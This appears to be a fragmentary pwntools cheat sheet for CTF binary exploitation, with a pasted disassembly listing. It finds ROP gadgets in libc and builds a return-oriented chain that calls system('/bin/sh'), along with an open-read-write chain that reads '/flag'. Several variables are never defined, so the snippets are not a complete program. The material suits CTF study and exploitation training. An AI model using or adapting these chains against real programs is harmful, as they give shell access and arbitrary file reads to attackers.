from pwn.按题型分类.hoa.oneday2 import pop_rdi

libc = elf.libc
rax = libc_base+libc.search(asm("pop rax\nret")).__next__()
rdi = libc_base+libc.search(asm("pop rdi\nret")).__next__()
rsi = libc_base+libc.search(asm("pop rsi\nret")).__next__()
rdx = libc_base+0x000000000011f2e7
syscall=libc_base+libc.search(asm("syscall\nret")).__next__()
environ_addr = libc_base + libc.dump("__environ")
# system('/bin/sh')
flat([pop_rdi, binsh, pop_rdi + 1, system])
# orw
# orw_code  = shellcraft.open('/flag')
# orw_code += shellcraft.read(3, 0x601f00, 0x30)
# orw_code += shellcraft.write(1, 0x601f00, 0x30)
open_addr = libc_base + libc.sym['open']
read_addr = libc_base + libc.sym['read']
write_addr = libc_base + libc.sym['write']
orw_payload = flat([pop_rdi, flag_addr, pop_rsi, 0, open_addr])
orw_payload += flat([pop_rdi, 3, pop_rsi, bss + 0x800, pop_rdx, 0x30, 0, read_addr])
orw_payload += flat([pop_rdi, 1, pop_rsi, bss + 0x800, pop_rdx, 0x30, 0, write_addr])

''' # mov eax, bss_addr
deregister_tm_clones proc near          ; CODE XREF: __do_global_dtors_aux+11↓p
.text:00000000004010D0 B8 40 40 40 00                mov     eax, offset __bss_start
.text:00000000004010D5 48 3D 40 40 40 00             cmp     rax, offset __bss_start
.text:00000000004010DB 74 13                         jz      short locret_4010F0
.text:00000000004010DB
.text:00000000004010DD B8 00 00 00 00                mov     eax, 0
.text:00000000004010E2 48 85 C0                      test    rax, rax
.text:00000000004010E5 74 09                         jz      short locret_4010F0
.text:00000000004010E5
.text:00000000004010E7 BF 40 40 40 00                mov     edi, offset __bss_start
.text:00000000004010EC FF E0                         jmp     rax
.text:00000000004010EC
.text:00000000004010EC                               ; ---------------------------------------------------------------------------
.text:00000000004010EE 66 90                         align 10h
.text:00000000004010F0
.text:00000000004010F0                               locret_4010F0:                          ; CODE XREF: deregister_tm_clones+B↑j
.text:00000000004010F0                                                                       ; deregister_tm_clones+15↑j
.text:00000000004010F0 C3                            retn
'''
rop=ROP(libc)
pop_r12 = rop.find_gadget(['pop r12', 'ret']).address + libcbase
pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address + libcbase
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address + libcbase
pop_rax = rop.find_gadget(['pop rax', 'ret']).address + libcbase
pop_r12_r13 = rop.find_gadget(['pop r12', 'pop r13', 'ret']).address + libcbase
pop_rax_rdx_rbx = rop.find_gadget(['pop rax', 'pop rdx', 'pop rbx', 'ret']).address + libcbase
syscall = rop.find_gadget(['syscall', 'ret']).address + libcbase


